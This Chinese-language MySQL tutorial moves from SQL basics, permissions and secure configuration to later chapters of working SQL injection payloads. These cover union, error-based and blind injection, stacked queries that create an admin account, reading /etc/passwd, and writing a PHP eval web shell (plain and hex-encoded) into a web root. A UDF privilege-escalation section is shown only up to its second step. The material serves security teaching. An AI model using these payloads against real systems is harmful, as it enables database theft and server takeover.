# MySQL 基础

> 本文档系统介绍 MySQL 数据库的核心知识，包括 SQL 语法、数据库设计和安全基础，为 Web 安全和 SQL 注入学习奠定基础。

---

## 目录

- [第一章：MySQL 概述](#第一章mysql-概述)
- [第二章：数据库与表](#第二章数据库与表)
- [第三章：数据类型](#第三章数据类型)
- [第四章：数据的增删改查（CRUD）](#第四章数据的增删改查crud)
- [第五章：高级查询](#第五章高级查询)
- [第六章：索引](#第六章索引)
- [第七章：用户与权限](#第七章用户与权限)
- [第八章：SQL 注入基础](#第八章sql-注入基础)
- [第九章：MySQL 安全配置](#第九章mysql-安全配置)

---

## 第一章：MySQL 概述

MySQL 是最流行的开源关系型数据库管理系统（RDBMS），由 Oracle 公司开发维护。它是 LAMP/WAMP 架构的核心组件，广泛应用于 Web 开发。

**特点**：
- 开源免费
- 性能优秀，支持高并发
- 跨平台
- 支持多种存储引擎（InnoDB、MyISAM 等）
- 丰富的 SQL 功能
- 庞大的社区和生态

**常用存储引擎**：

| 引擎 | 特点 | 适用场景 |
|------|------|---------|
| **InnoDB** | 支持事务、行级锁、外键、崩溃恢复 | 一般应用，默认引擎 |
| **MyISAM** | 不支持事务，表级锁，速度快 | 读多写少、日志统计 |
| **Memory** | 内存存储，速度极快，数据不持久 | 缓存、临时数据 |

**连接 MySQL**：
```bash
# 命令行连接
mysql -u root -p
mysql -u root -p -h 127.0.0.1 -P 3306

# 常用命令
show databases;      -- 查看所有数据库
use dbname;          -- 切换数据库
show tables;         -- 查看所有表
desc tablename;      -- 查看表结构
```

---

## 第二章：数据库与表

### 2.1 数据库操作

```sql
-- 创建数据库
CREATE DATABASE testdb DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;

-- 查看所有数据库
SHOW DATABASES;

-- 切换数据库
USE testdb;

-- 查看当前数据库
SELECT DATABASE();

-- 删除数据库
DROP DATABASE testdb;

-- 修改数据库字符集
ALTER DATABASE testdb CHARACTER SET utf8mb4;
```

### 2.2 表操作

```sql
-- 创建表
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY COMMENT '主键ID',
    username VARCHAR(50) NOT NULL UNIQUE COMMENT '用户名',
    password VARCHAR(100) NOT NULL COMMENT '密码',
    email VARCHAR(100) COMMENT '邮箱',
    age INT DEFAULT 0 COMMENT '年龄',
    gender ENUM('male', 'female', 'unknown') DEFAULT 'unknown' COMMENT '性别',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='用户表';

-- 查看表结构
DESC users;
DESCRIBE users;
SHOW COLUMNS FROM users;

-- 查看建表语句
SHOW CREATE TABLE users;

-- 修改表
ALTER TABLE users ADD COLUMN phone VARCHAR(20) AFTER email;  -- 添加字段
ALTER TABLE users MODIFY COLUMN phone VARCHAR(30);          -- 修改字段类型
ALTER TABLE users CHANGE COLUMN phone mobile VARCHAR(30);   -- 修改字段名
ALTER TABLE users DROP COLUMN mobile;                       -- 删除字段
ALTER TABLE users RENAME TO user;                           -- 重命名表

-- 删除表
DROP TABLE users;

-- 清空表
TRUNCATE TABLE users;  -- 重置自增ID，更快
DELETE FROM users;     -- 逐行删除，不重置自增
```

### 2.3 约束

| 约束 | 说明 |
|------|------|
| `PRIMARY KEY` | 主键，唯一且非空 |
| `UNIQUE` | 唯一约束，值不能重复 |
| `NOT NULL` | 非空约束，值不能为空 |
| `DEFAULT` | 默认值 |
| `FOREIGN KEY` | 外键，关联其他表的主键 |
| `CHECK` | 检查约束（MySQL 8.0.16+） |

---

## 第三章：数据类型

### 3.1 数值类型

| 类型 | 大小 | 范围 |
|------|------|------|
| `TINYINT` | 1字节 | -128~127 |
| `SMALLINT` | 2字节 | -32768~32767 |
| `MEDIUMINT` | 3字节 | -838万~838万 |
| `INT` | 4字节 | -21亿~21亿 |
| `BIGINT` | 8字节 | -9e18~9e18 |
| `FLOAT` | 4字节 | 单精度浮点数 |
| `DOUBLE` | 8字节 | 双精度浮点数 |
| `DECIMAL(M,D)` | 可变 | 精确小数，M 总位数，D 小数位 |

### 3.2 字符串类型

| 类型 | 大小 | 说明 |
|------|------|------|
| `CHAR(M)` | 0~255字节 | 定长字符串，M 是字符数 |
| `VARCHAR(M)` | 0~65535字节 | 变长字符串，M 是字符数 |
| `TINYTEXT` | 0~255字节 | 短文本 |
| `TEXT` | 0~65535字节 | 普通文本 |
| `MEDIUMTEXT` | 0~16MB | 中等文本 |
| `LONGTEXT` | 0~4GB | 长文本 |
| `ENUM('a','b',...)` | 1~2字节 | 枚举，只能选一个 |
| `SET('a','b',...)` | 1~8字节 | 集合，可选多个 |

### 3.3 日期时间类型

| 类型 | 格式 | 范围 |
|------|------|------|
| `DATE` | YYYY-MM-DD | 日期 |
| `TIME` | HH:MM:SS | 时间 |
| `DATETIME` | YYYY-MM-DD HH:MM:SS | 日期+时间 |
| `TIMESTAMP` | YYYY-MM-DD HH:MM:SS | 时间戳（自动更新） |
| `YEAR` | YYYY | 年份 |

### 3.4 二进制类型

| 类型 | 大小 | 说明 |
|------|------|------|
| `BINARY(M)` | M字节 | 定长二进制 |
| `VARBINARY(M)` | 0~M字节 | 变长二进制 |
| `BLOB` | 0~65535字节 | 二进制大对象 |
| `MEDIUMBLOB` | 0~16MB | 中等二进制 |
| `LONGBLOB` | 0~4GB | 长二进制 |

---

## 第四章：数据的增删改查（CRUD）

### 4.1 INSERT（插入）

```sql
-- 插入一行
INSERT INTO users (username, password, email, age)
VALUES ('admin', '123456', 'admin@example.com', 25);

-- 插入多行
INSERT INTO users (username, password, email) VALUES
    ('user1', 'pass1', 'user1@example.com'),
    ('user2', 'pass2', 'user2@example.com'),
    ('user3', 'pass3', 'user3@example.com');

-- 插入查询结果
INSERT INTO users_backup SELECT * FROM users;
```

### 4.2 SELECT（查询）

```sql
-- 查询所有列
SELECT * FROM users;

-- 查询指定列
SELECT id, username, email FROM users;

-- 别名
SELECT username AS '用户名', email AS '邮箱' FROM users;

-- 去重
SELECT DISTINCT age FROM users;

-- 条件查询
SELECT * FROM users WHERE id = 1;
SELECT * FROM users WHERE username = 'admin';
SELECT * FROM users WHERE age > 20;
SELECT * FROM users WHERE age >= 18 AND age <= 30;
SELECT * FROM users WHERE age BETWEEN 18 AND 30;
SELECT * FROM users WHERE age IN (20, 25, 30);
SELECT * FROM users WHERE username LIKE 'a%';   -- 以 a 开头
SELECT * FROM users WHERE username LIKE '%a%';  -- 包含 a
SELECT * FROM users WHERE email IS NULL;         -- 为空
SELECT * FROM users WHERE email IS NOT NULL;     -- 不为空

-- 排序
SELECT * FROM users ORDER BY id ASC;        -- 升序（默认）
SELECT * FROM users ORDER BY age DESC;      -- 降序
SELECT * FROM users ORDER BY age DESC, id ASC;  -- 多字段排序

-- 限制数量
SELECT * FROM users LIMIT 10;           -- 前 10 条
SELECT * FROM users LIMIT 10, 5;        -- 从第 10 条开始，取 5 条（分页）
SELECT * FROM users LIMIT 5 OFFSET 10;  -- 同上，OFFSET 写法
```

### 4.3 UPDATE（更新）

```sql
-- 更新一行或多行
UPDATE users SET age = 26 WHERE id = 1;

-- 更新多个字段
UPDATE users SET email = 'new@example.com', age = 27 WHERE username = 'admin';

-- 自增/自减
UPDATE users SET age = age + 1 WHERE id = 1;
```

> ⚠️ **注意**：UPDATE 一定要加 WHERE 条件，否则会更新所有行！

### 4.4 DELETE（删除）

```sql
-- 删除指定行
DELETE FROM users WHERE id = 1;

-- 删除满足条件的行
DELETE FROM users WHERE age < 18;

-- 删除所有行（不重置自增）
DELETE FROM users;
```

> ⚠️ **注意**：DELETE 一定要加 WHERE 条件，否则会删除所有数据！建议先 SELECT 确认再 DELETE。

---

## 第五章：高级查询

### 5.1 聚合函数

| 函数 | 说明 |
|------|------|
| `COUNT(*)` | 统计行数 |
| `COUNT(column)` | 统计非 NULL 的行数 |
| `SUM(column)` | 求和 |
| `AVG(column)` | 平均值 |
| `MAX(column)` | 最大值 |
| `MIN(column)` | 最小值 |

```sql
SELECT COUNT(*) AS '总人数' FROM users;
SELECT AVG(age) AS '平均年龄' FROM users;
SELECT MAX(age) AS '最大年龄', MIN(age) AS '最小年龄' FROM users;
SELECT SUM(age) AS '年龄总和' FROM users;
```

### 5.2 分组查询

```sql
-- 按性别分组统计人数
SELECT gender, COUNT(*) AS num 
FROM users 
GROUP BY gender;

-- 按城市分组，统计每组平均年龄
SELECT city, AVG(age) AS avg_age 
FROM users 
GROUP BY city;

-- HAVING：过滤分组后的结果
SELECT city, COUNT(*) AS num 
FROM users 
GROUP BY city 
HAVING num > 10;
```

> WHERE 和 HAVING 的区别：WHERE 在分组前过滤行，HAVING 在分组后过滤组。

### 5.3 联表查询（JOIN）

假设有两张表：`users`（用户表）和 `orders`（订单表）。

```sql
-- 内连接（只返回两表都匹配的行）
SELECT users.username, orders.order_no, orders.amount
FROM users
INNER JOIN orders ON users.id = orders.user_id;

-- 左连接（左表全部，右表匹配不到则为 NULL）
SELECT users.username, orders.order_no
FROM users
LEFT JOIN orders ON users.id = orders.user_id;

-- 右连接（右表全部，左表匹配不到则为 NULL）
SELECT users.username, orders.order_no
FROM users
RIGHT JOIN orders ON users.id = orders.user_id;

-- 多表连接
SELECT u.username, o.order_no, p.product_name
FROM users u
JOIN orders o ON u.id = o.user_id
JOIN order_items oi ON o.id = oi.order_id
JOIN products p ON oi.product_id = p.id;
```

### 5.4 子查询

```sql
-- 标量子查询（返回单个值）
SELECT * FROM users WHERE age > (SELECT AVG(age) FROM users);

-- 列子查询（返回一列）
SELECT * FROM users WHERE id IN (SELECT user_id FROM orders);

-- 行子查询（返回一行）
SELECT * FROM users WHERE (age, gender) = 
    (SELECT age, gender FROM users WHERE id = 1);

-- EXISTS 子查询
SELECT * FROM users WHERE EXISTS 
    (SELECT 1 FROM orders WHERE orders.user_id = users.id);
```

### 5.5 常用函数

```sql
-- 字符串函数
SELECT CONCAT('Hello', ' ', 'World');  -- 拼接
SELECT SUBSTRING('Hello', 1, 3);        -- 截取
SELECT LENGTH('Hello');                 -- 长度
SELECT UPPER('hello');                  -- 大写
SELECT LOWER('HELLO');                  -- 小写
SELECT REPLACE('Hello', 'l', 'L');      -- 替换
SELECT TRIM('  hello  ');               -- 去空白

-- 数值函数
SELECT ABS(-10);      -- 绝对值
SELECT ROUND(3.1415, 2);  -- 四舍五入
SELECT CEIL(3.1);     -- 向上取整
SELECT FLOOR(3.9);    -- 向下取整
SELECT MOD(10, 3);    -- 取余

-- 日期函数
SELECT NOW();         -- 当前日期时间
SELECT CURDATE();     -- 当前日期
SELECT CURTIME();     -- 当前时间
SELECT YEAR(NOW());   -- 年
SELECT MONTH(NOW());  -- 月
SELECT DAY(NOW());    -- 日
SELECT DATE_ADD(NOW(), INTERVAL 7 DAY);  -- 加7天
SELECT DATEDIFF('2024-01-01', '2023-01-01');  -- 日期差

-- 条件函数
SELECT IF(age >= 18, '成年', '未成年') FROM users;
SELECT IFNULL(email, '未填写') FROM users;
SELECT CASE gender WHEN 'male' THEN '男' WHEN 'female' THEN '女' ELSE '未知' END FROM users;
```

---

## 第六章：索引

索引是加速查询的数据库对象，类似于书的目录，可以大幅提高查询效率，但会降低写入速度。

### 6.1 索引类型

| 类型 | 说明 |
|------|------|
| **主键索引** | PRIMARY KEY，唯一且非空 |
| **唯一索引** | UNIQUE，值唯一 |
| **普通索引** | INDEX，最常用 |
| **全文索引** | FULLTEXT，用于文本搜索 |
| **联合索引** | 多个字段组成的索引 |

### 6.2 索引操作

```sql
-- 创建索引
CREATE INDEX idx_username ON users(username);
CREATE UNIQUE INDEX idx_email ON users(email);
CREATE INDEX idx_name_age ON users(username, age);  -- 联合索引

-- 查看索引
SHOW INDEX FROM users;

-- 删除索引
DROP INDEX idx_username ON users;
```

### 6.3 索引使用原则

1. 适合索引的场景：WHERE 条件字段、JOIN 连接字段、ORDER BY 字段、GROUP BY 字段
2. 不适合索引的场景：数据量小的表、频繁更新的字段、区分度低的字段（如性别）
3. 联合索引遵循最左前缀原则
4. 索引不是越多越好，会占用空间并降低写入性能

### 6.4 查看执行计划

```sql
EXPLAIN SELECT * FROM users WHERE username = 'admin';
```

关注 `type` 列（访问类型）：
- `system` > `const` > `eq_ref` > `ref` > `range` > `index` > `ALL`
- 越往左性能越好，`ALL` 表示全表扫描，需要优化

---

## 第七章：用户与权限

### 7.1 用户管理

```sql
-- 创建用户
CREATE USER 'username'@'localhost' IDENTIFIED BY 'password';
CREATE USER 'username'@'%' IDENTIFIED BY 'password';  -- 允许任意 IP 连接

-- 修改密码
ALTER USER 'username'@'localhost' IDENTIFIED BY 'new_password';

-- 删除用户
DROP USER 'username'@'localhost';

-- 查看所有用户
SELECT user, host FROM mysql.user;
```

### 7.2 权限管理

```sql
-- 授予所有权限
GRANT ALL PRIVILEGES ON database.* TO 'user'@'localhost';

-- 授予指定权限
GRANT SELECT, INSERT ON testdb.* TO 'user'@'localhost';

-- 授予指定表权限
GRANT SELECT ON testdb.users TO 'user'@'localhost';

-- 刷新权限
FLUSH PRIVILEGES;

-- 查看权限
SHOW GRANTS FOR 'user'@'localhost';

-- 收回权限
REVOKE INSERT ON testdb.* FROM 'user'@'localhost';
REVOKE ALL PRIVILEGES ON *.* FROM 'user'@'localhost';
```

**权限最小化原则**：只授予必要的权限，限制登录 IP，避免使用 root 账号直连应用。

---

## 第八章：SQL 注入基础

### 8.1 什么是 SQL 注入

SQL 注入（SQL Injection）是一种代码注入攻击，攻击者通过在输入中插入恶意 SQL 代码，操纵数据库执行非预期的操作。

**示例**：

正常登录查询：
```sql
SELECT * FROM users WHERE username = 'admin' AND password = '123456'
```

攻击者输入 `admin' --` 作为用户名，密码任意：
```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'xxx'
```

`--` 注释掉了后面的密码校验，直接登录成功。

### 8.2 SQL 注入的类型

| 类型 | 说明 |
|------|------|
| **联合查询注入** | UNION SELECT 拼接查询结果 |
| **报错注入** | 利用报错信息获取数据 |
| **布尔盲注** | 通过页面真假判断数据 |
| **时间盲注** | 通过延迟判断数据 |
| **堆叠注入** | 多语句执行（; 分隔） |
| **宽字节注入** | 利用字符集编码问题 |
| **二次注入** | 数据入库时未转义，取出时触发 |

### 8.3 常见注入点

- GET / POST 参数
- HTTP 头（User-Agent、Referer、Cookie 等）
- 文件名
- JSON 数据
- 排序字段、分页参数

### 8.4 防护方法

1. **使用预处理语句（Prepared Statement）**：最有效的防护手段
2. **输入验证**：白名单校验
3. **输出编码**：根据输出上下文编码
4. **最小权限**：数据库账号最小权限
5. **WAF**：Web 应用防火墙辅助防护
6. **安全编码规范**：代码审计，避免拼接 SQL

---

## 第九章：MySQL 安全配置

### 9.1 基础安全配置

1. **修改默认端口**：默认 3306 改为其他端口
2. **禁止 root 远程登录**：只允许本地登录
3. **删除匿名用户**：`DELETE FROM mysql.user WHERE user='';`
4. **删除测试数据库**：`DROP DATABASE test;`
5. **启用日志**：错误日志、慢查询日志、审计日志
6. **设置强密码**：使用复杂密码策略
7. **定期备份**：全量备份 + 增量备份
8. **及时更新**：安装安全补丁

### 9.2 配置文件安全（my.cnf / my.ini）

```ini
[mysqld]
# 绑定地址（只允许本地）
bind-address = 127.0.0.1

# 修改端口
port = 3307

# 禁用 LOAD DATA LOCAL（防止文件读取）
local-infile = 0

# 关闭符号链接
symbolic-links = 0

# 慢查询日志
slow_query_log = ON
slow_query_log_file = /var/log/mysql/slow.log
long_query_time = 2

# 错误日志
log_error = /var/log/mysql/error.log

# 认证插件
default_authentication_plugin = mysql_native_password
```

---

## SQL 代码示例

详见 `sql/` 目录中的 SQL 脚本：
- `init.sql` - 数据库初始化脚本（建库、建表、插入测试数据）
- `query_examples.sql` - 各种查询示例
- `user_manage.sql` - 用户与权限管理示例

> **延伸学习**：MySQL 是 Web 应用最常用的数据库，也是 SQL 注入漏洞的主要目标。掌握 MySQL 基础后，可进一步学习 SQL 注入原理与利用（联合查询、报错注入、盲注等），以及 MySQL 提权和 UDF 等高级技术。

---

## 第十章：存储引擎详解

### 10.1 InnoDB 存储引擎

InnoDB 是 MySQL 5.5+ 的默认存储引擎，支持事务、行级锁和外键。

```sql
-- 查看存储引擎
SHOW ENGINES;

-- 指定表的存储引擎
CREATE TABLE users (
    id INT PRIMARY KEY AUTO_INCREMENT,
    name VARCHAR(50)
) ENGINE=InnoDB;

-- 修改存储引擎
ALTER TABLE users ENGINE=InnoDB;
```

**InnoDB 架构**：

```
┌──────────────────────────────────────────────────┐
│                   InnoDB 架构                     │
├──────────────────────────────────────────────────┤
│                                                  │
│  内存区域：                                       │
│  ┌────────────┐  ┌────────────┐  ┌────────────┐ │
│  │ Buffer Pool│  │ Log Buffer│  │ 额外内存池 │ │
│  │ (数据页缓存)│  │ (重做日志)│  │           │ │
│  └────────────┘  └────────────┘  └────────────┘ │
│                                                  │
│  后台线程：                                       │
│  ┌────────────┐  ┌────────────┐  ┌────────────┐ │
│  │ Master     │  │ IO Thread  │  │ Purge      │ │
│  │ Thread     │  │ (读写线程)│  │ Thread     │ │
│  └────────────┘  └────────────┘  └────────────┘ │
│                                                  │
│  存储文件：                                       │
│  ┌────────────┐  ┌────────────┐                 │
│  │ .ibd 文件  │  │ redo log   │                 │
│  │ (数据和索引)│  │ (事务日志)│                 │
│  └────────────┘  └────────────┘                 │
│                                                  │
│  关键特性：                                       │
│  - MVCC 多版本并发控制                           │
│  - 行级锁 + 间隙锁                               │
│  - 插入缓冲（Change Buffer）                     │
│  - 自适应哈希索引                                 │
│  - doublewrite buffer（双写缓冲）                │
└──────────────────────────────────────────────────┘
```

### 10.2 InnoDB 锁机制

```sql
-- 共享锁（S锁，读锁）
SELECT * FROM users WHERE id = 1 LOCK IN SHARE MODE;

-- 排他锁（X锁，写锁）
SELECT * FROM users WHERE id = 1 FOR UPDATE;

-- 行锁示例
-- 会话1：锁定 id=1 的行
BEGIN;
UPDATE users SET name='test' WHERE id=1;

-- 会话2：尝试修改同一行（阻塞）
UPDATE users SET name='test2' WHERE id=1;  -- 等待...

-- 间隙锁示例（防止幻读）
-- 假设 id 列有值 1,3,5,7
BEGIN;
SELECT * FROM users WHERE id > 3 AND id < 7 FOR UPDATE;
-- 锁定 (3,7) 之间的间隙，其他事务无法在此范围插入
```

**锁类型对比**：

| 锁类型 | 说明 | 兼容性 |
|--------|------|--------|
| **记录锁** | 锁定索引记录 | S 与 S 兼容，S 与 X 不兼容 |
| **间隙锁** | 锁定索引间隙 | 仅与插入意向锁冲突 |
| **临键锁** | 记录锁+间隙锁 | InnoDB 默认 RR 隔离级别使用 |
| **意向锁** | 表级锁，表示意图 | 仅与表级锁冲突 |
| **自增锁** | AUTO_INCREMENT | 特殊的表锁 |

### 10.3 事务隔离级别

```sql
-- 查看当前隔离级别
SELECT @@transaction_isolation;

-- 设置隔离级别
SET SESSION TRANSACTION ISOLATION LEVEL READ COMMITTED;
SET GLOBAL TRANSACTION ISOLATION LEVEL REPEATABLE READ;
```

| 隔离级别 | 脏读 | 不可重复读 | 幻读 | 性能 |
|---------|------|-----------|------|------|
| **READ UNCOMMITTED** | 可能 | 可能 | 可能 | 最高 |
| **READ COMMITTED** | 不可能 | 可能 | 可能 | 高 |
| **REPEATABLE READ** | 不可能 | 不可能 | 可能* | 中 |
| **SERIALIZABLE** | 不可能 | 不可能 | 不可能 | 最低 |

> *InnoDB 的 REPEATABLE READ 通过临键锁解决了幻读问题。

### 10.4 事务与 redo/undo 日志

```sql
-- 事务基本操作
BEGIN;
-- 或 START TRANSACTION;

INSERT INTO users(name) VALUES('test1');
INSERT INTO users(name) VALUES('test2');

COMMIT;   -- 提交
-- 或 ROLLBACK;  -- 回滚

-- 保存点
BEGIN;
INSERT INTO users(name) VALUES('test1');
SAVEPOINT sp1;
INSERT INTO users(name) VALUES('test2');
ROLLBACK TO sp1;  -- 回滚到保存点，test2 被撤销
COMMIT;
```

```
事务日志机制：

redo log（重做日志）：
  - 记录数据页的物理修改
  - 用于崩溃恢复（Crash Recovery）
  - WAL（Write-Ahead Logging）机制：先写日志再写数据
  - 循环写入，固定大小

undo log（回滚日志）：
  - 记录修改前的旧值
  - 用于事务回滚
  - 用于 MVCC 读取旧版本数据
  - 存储在回滚段中

binlog（二进制日志）：
  - 记录所有数据变更操作
  - 用于主从复制
  - 用于数据恢复（PITR - 时间点恢复）
  - 逻辑日志（SQL 语句或行变更）

两阶段提交（2PC）：
  1. InnoDB 写 redo log（prepare 状态）
  2. MySQL 写 binlog
  3. InnoDB 写 redo log（commit 状态）
  
  目的：保证 redo log 和 binlog 数据一致性
```

---

## 第十一章：MySQL 权限系统深入

### 11.1 权限层级

```
MySQL 权限层级：

全局级（*.*）
  ├── SUPER, CREATE, DROP, RELOAD, SHUTDOWN, PROCESS, FILE...
  ├── GRANT ALL PRIVILEGES ON *.* TO 'user'@'%'

数据库级（db.*）
  ├── SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, ALTER...
  ├── GRANT SELECT, INSERT ON mydb.* TO 'user'@'%'

表级（db.table）
  ├── SELECT, INSERT, UPDATE, DELETE, ALTER, INDEX...
  ├── GRANT SELECT ON mydb.users TO 'user'@'%'

列级（db.table.column）
  ├── SELECT (column), INSERT (column), UPDATE (column)
  ├── GRANT SELECT (name, email) ON mydb.users TO 'user'@'%'

存储过程级
  ├── EXECUTE, ALTER ROUTINE, CREATE ROUTINE
  ├── GRANT EXECUTE ON PROCEDURE mydb.myproc TO 'user'@'%'
```

### 11.2 权限表详解

```sql
-- 权限存储在 mysql 系统库中
USE mysql;

-- 用户表（存储全局权限）
SELECT user, host, authentication_string, 
       Select_priv, Insert_priv, Update_priv, Delete_priv,
       File_priv, Super_priv, Shutdown_priv
FROM user;

-- 数据库级权限表
SELECT * FROM db WHERE Db = 'testdb';

-- 表级权限表
SELECT * FROM tables_priv WHERE Db = 'testdb';

-- 列级权限表
SELECT * FROM columns_priv WHERE Db = 'testdb';

-- 检查权限
SHOW GRANTS;                        -- 当前用户权限
SHOW GRANTS FOR 'user'@'%';        -- 指定用户权限
```

### 11.3 安全相关权限

| 权限 | 风险等级 | 说明 | 安全建议 |
|------|---------|------|---------|
| **FILE** | 极高 | 读写文件 | 禁止授予应用账号 |
| **SUPER** | 极高 | 管理操作、设置变量 | 仅管理员持有 |
| **PROCESS** | 高 | 查看所有进程 | 仅管理员持有 |
| **RELOAD** | 高 | 刷新权限/日志 | 仅管理员持有 |
| **SHUTDOWN** | 高 | 关闭数据库 | 仅管理员持有 |
| **CREATE** | 中 | 创建数据库/表 | 谨慎授予 |
| **DROP** | 中 | 删除数据库/表 | 谨慎授予 |
| **GRANT** | 极高 | 授权给其他用户 | 仅管理员持有 |
| **ALTER** | 中 | 修改表结构 | 谨慎授予 |
| **EXECUTE** | 中 | 执行存储过程 | 谨慎授予 |

```sql
-- 安全的用户创建示例
-- 应用用户（最小权限）
CREATE USER 'webapp'@'192.168.1.%' IDENTIFIED BY 'StrongP@ss123!';
GRANT SELECT, INSERT, UPDATE, DELETE ON webapp.* TO 'webapp'@'192.168.1.%';
FLUSH PRIVILEGES;

-- 管理员用户（限定来源 IP）
CREATE USER 'dba'@'10.0.0.5' IDENTIFIED BY 'DbaP@ss456!';
GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, ALTER, INDEX, 
      ALTER ROUTINE, CREATE ROUTINE, EXECUTE, TRIGGER 
ON *.* TO 'dba'@'10.0.0.5';
-- 不授予 FILE, SUPER, PROCESS, RELOAD, SHUTDOWN, GRANT
FLUSH PRIVILEGES;

-- 检查权限分配
SELECT user, host, 
       File_priv, Super_priv, Process_priv, 
       Grant_priv, Shutdown_priv
FROM mysql.user 
WHERE user NOT IN ('root','mysql.sys','mysql.session','mysql.infoschema');
```

---

## 第十二章：MySQL 注入技术详解

### 12.1 联合查询注入完整流程

```sql
-- 1. 判断注入点
?id=1'                      -- 报错，存在注入
?id=1 AND 1=1              -- 正常
?id=1 AND 1=2              -- 无数据

-- 2. 判断字段数
?id=1 ORDER BY 1--          -- 正常
?id=1 ORDER BY 2--          -- 正常
?id=1 ORDER BY 3--          -- 正常
?id=1 ORDER BY 4--          -- 报错 → 3 个字段

-- 3. 判断显示位
?id=-1 UNION SELECT 1,2,3-- 
-- 页面显示 2 和 3 → 第2、3 列有回显

-- 4. 获取基本信息
?id=-1 UNION SELECT 1,version(),database()-- 
-- 输出：5.7.33-log, webapp

-- 5. 获取所有数据库
?id=-1 UNION SELECT 1,GROUP_CONCAT(schema_name),3 
FROM information_schema.schemata-- 

-- 6. 获取指定库的表
?id=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3 
FROM information_schema.tables 
WHERE table_schema='webapp'-- 

-- 7. 获取列名
?id=-1 UNION SELECT 1,GROUP_CONCAT(column_name),3 
FROM information_schema.columns 
WHERE table_schema='webapp' AND table_name='users'-- 

-- 8. 获取数据
?id=-1 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 
FROM webapp.users-- 

-- 9. 获取当前用户和权限
?id=-1 UNION SELECT 1,user(),@@datadir-- 
?id=-1 UNION SELECT 1,super_priv,file_priv,3 
FROM mysql.user WHERE user=substring_index(user(),'@',1)-- 
```

### 12.2 报错注入

```sql
-- extractvalue 报错（最多32位）
?id=1 AND extractvalue(1,concat(0x7e,user(),0x7e))-- 
-- 输出：XPATH syntax error: '~root@localhost~'

-- updatexml 报错（最多32位）
?id=1 AND updatexml(1,concat(0x7e,(SELECT version())),1)-- 

-- floor 报错（无长度限制）
?id=1 AND (SELECT 1 FROM (
    SELECT count(*),concat(
        user(),
        floor(rand(0)*2)
    )x FROM information_schema.tables GROUP BY x
)a)-- 

-- 利用 join 报错获取列名（不需要 information_schema）
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))a)-- 

-- 利用多行报错获取更多信息
?id=1 AND extractvalue(1,concat(0x7e,(
    SELECT GROUP_CONCAT(table_name) 
    FROM information_schema.tables 
    WHERE table_schema=database()
)))-- 
```

### 12.3 布尔盲注

```sql
-- 逐字符猜解
-- 判断数据库名长度
?id=1 AND length(database())=5-- 
?id=1 AND length(database())=6-- 

-- 逐字符猜解数据库名
?id=1 AND ascii(substring(database(),1,1))>100-- 
?id=1 AND ascii(substring(database(),1,1))>110-- 
?id=1 AND ascii(substring(database(),1,1))=119-- 
-- ASCII 119 = 'w'

-- 使用二分法加速
?id=1 AND ascii(substring(database(),1,1))>115--   -- true
?id=1 AND ascii(substring(database(),1,1))>117--   -- false
?id=1 AND ascii(substring(database(),1,1))=116--   -- true → 't'

-- 使用 REGEXP 加速
?id=1 AND database() REGEXP '^w'-- 
?id=1 AND database() REGEXP '^we'-- 
?id=1 AND database() REGEXP '^web'-- 

-- 使用 LIKE 加速
?id=1 AND database() LIKE 'w%'-- 
?id=1 AND database() LIKE 'we%'-- 
```

### 12.4 时间盲注

```sql
-- 基础延时
?id=1 AND SLEEP(5)-- 
-- 响应延迟 5 秒 → 存在注入

-- 条件延时
?id=1 AND IF(length(database())>5, SLEEP(5), 0)-- 
?id=1 AND IF(length(database())>10, SLEEP(5), 0)-- 

-- 逐字符猜解
?id=1 AND IF(ascii(substring(database(),1,1))>100, SLEEP(5), 0)-- 
?id=1 AND IF(ascii(substring(database(),1,1))=119, SLEEP(5), 0)-- 

-- 使用 BENCHMARK 替代 SLEEP（某些环境过滤了 SLEEP）
?id=1 AND IF(1=1, BENCHMARK(5000000,MD5('test')), 0)-- 

-- 使用条件表达式替代
?id=1 AND (SELECT IF(SUBSTRING(database(),1,1)='w',SLEEP(5),0))-- 
```

### 12.5 堆叠注入

```sql
-- MySQL 默认不支持堆叠查询（PHP+MySQL不开启 multi_query）
-- 但某些环境支持（如 MySQL CLI、PDO::ATTR_EMULATE_PREPARES）

-- 堆叠注入示例
?id=1;SELECT user()-- 
?id=1;INSERT INTO users(username,password) VALUES('hacker','123')-- 
?id=1;UPDATE users SET is_admin=1 WHERE username='hacker'-- 
```

### 12.6 读写文件

```sql
-- 读取文件（需要 FILE 权限和 secure_file_priv 配置）
?id=-1 UNION SELECT 1,load_file('/etc/passwd'),3-- 
?id=-1 UNION SELECT 1,load_file('C:\\Windows\\win.ini'),3-- 
?id=-1 UNION SELECT 1,load_file(0x2F6574632F706173737764),3-- -- hex 编码

-- 写文件（需要 FILE 权限）
?id=1 UNION SELECT 1,'<?php phpinfo();?>',3 
INTO OUTFILE '/var/www/html/test.php'-- 

?id=1 UNION SELECT 1,'<?php @eval($_POST["cmd"]);?>',3 
INTO DUMPFILE '/var/www/html/shell.php'-- 

-- 利用 hex 编码绕过引号过滤
?id=1 UNION SELECT 1,0x3C3F70687020406576616C28245F504F53545B22636D64225D293B3F3E,3 
INTO DUMPFILE '/var/www/html/shell.php'-- 

-- 查看 secure_file_priv 设置
SHOW VARIABLES LIKE 'secure_file_priv';
-- NULL  → 禁止文件操作
-- '/var/lib/mysql-files/' → 仅允许该目录
-- 空 → 无限制（危险）
```

---

## 第十三章：MySQL 提权技术

### 13.1 UDF 提权

UDF（User Defined Functions）提权是通过加载自定义函数库执行系统命令。

```sql
-- UDF 提权前提条件：
-- 1. 当前用户有 FILE 权限
-- 2. secure_file_priv 允许写入插件目录
-- 3. 知道插件目录路径

-- 步骤1：查看插件目录
SHOW VARIABLES LIKE 'plugin_dir';
-- 输出：/usr/lib/mysql/plugin/ 或 C:\Program Files\MySQL\lib\plugin\

-- 步骤2：写入 UDF 动态链接库
-- MySQL 5.x: 使用 .dll（Windows）或 .so（Linux）
-- MySQL 8.x: 插件目录可能不可写，需其他方法

